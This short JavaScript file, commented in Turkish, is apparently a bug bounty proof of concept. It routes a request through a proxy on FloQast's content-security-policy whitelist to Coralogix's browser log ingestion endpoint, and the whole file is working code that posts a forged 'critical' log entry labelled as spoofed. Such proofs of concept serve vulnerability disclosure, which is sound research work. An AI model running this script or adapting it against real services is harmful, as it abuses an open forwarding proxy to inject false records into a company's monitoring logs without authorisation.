/**
 * Enes tarafından hazırlanmıştır — Bug Bounty PoC
 * FloQast'ta CSP whitelist'ine dahil olan proxy kullanılarak
 * Coralogix log altyapısına sahte log enjekte edilir.
 */

(function () {

  window.sdkConfig = window.sdkConfig || {};
  window.sdkConfig.proxyUrl = "https://au.floqast.app/cxproxy";  
  window.sdkConfig.suffix = "/browser/v1beta/logs";              // Coralogix endpoint

  class EnesRequest {
    constructor(requestConfig) {
      this.requestConfig = requestConfig;
      this.resolvedUrl = '';
      this.resolvedHeaders = {};
      this.init();
    }

    init() {
      const sdkConfig = window.sdkConfig || {};
      const { proxyUrl, coralogixDomain = "US1", public_key } = sdkConfig;
      const { suffix, headers } = this.requestConfig;
      const cxEndpoint = `https://ingress.${coralogixDomain.toLowerCase()}.rum-ingress-coralogix.com${suffix}`;
      this.resolvedUrl = proxyUrl
        ? `${proxyUrl}?cxforward=${encodeURIComponent(cxEndpoint)}`
        : cxEndpoint;
      if (public_key) {
        headers['Authorization'] = `Bearer ${public_key}`;
      }
      this.resolvedHeaders = headers;
    }

    send(body) {
      return fetch(this.resolvedUrl, {
        method: 'POST',
        headers: this.resolvedHeaders,
        body,
      }).then(res => {
        console.log("Sahte log gönderildi! HTTP status:", res.status);
        return res;
      }).catch((e) => {
        console.error("❌ Fetch hatası:", e);
      });
    }
  }

  const req = new EnesRequest({
    suffix: "/browser/v1beta/logs",
    headers: { "Content-Type": "application/json" }
  });

  req.send(JSON.stringify({
    msg: "Enes tarafından gönderilen sahte log",
    severity: "critical",
    labels: {
      attacker: "enes",
      spoofed: "true",
      via: "floqast-cxproxy"
    }
  }));
})();
